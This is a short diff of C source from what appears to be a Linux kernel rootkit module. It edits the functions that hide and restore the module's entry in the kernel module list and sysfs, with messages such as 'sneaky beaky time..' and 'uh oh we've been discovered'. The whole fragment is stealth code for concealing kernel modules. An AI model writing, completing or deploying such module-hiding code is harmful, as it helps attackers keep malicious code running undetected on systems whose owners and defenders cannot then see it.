@@ -58,12 +58,14 @@ void hide_module(void) {
   printk(KERN_INFO "sneaky beaky time..\n");
 }
 
-void unhide_kobj(void) { returnval = kobject_create_and_add(name, parent); }
+void unhide_kobj(void) {
+  kobject_add(&THIS_MODULE->mkobj.kobj, parent, "%s", name);
+}
 
 void unhide(void) {
   list_add(&THIS_MODULE->list, prev_module);
-  hidden = 0;
   unhide_kobj();
+  hidden = 0;
   printk(KERN_INFO "uh oh we've been discovered\n");
 }
 
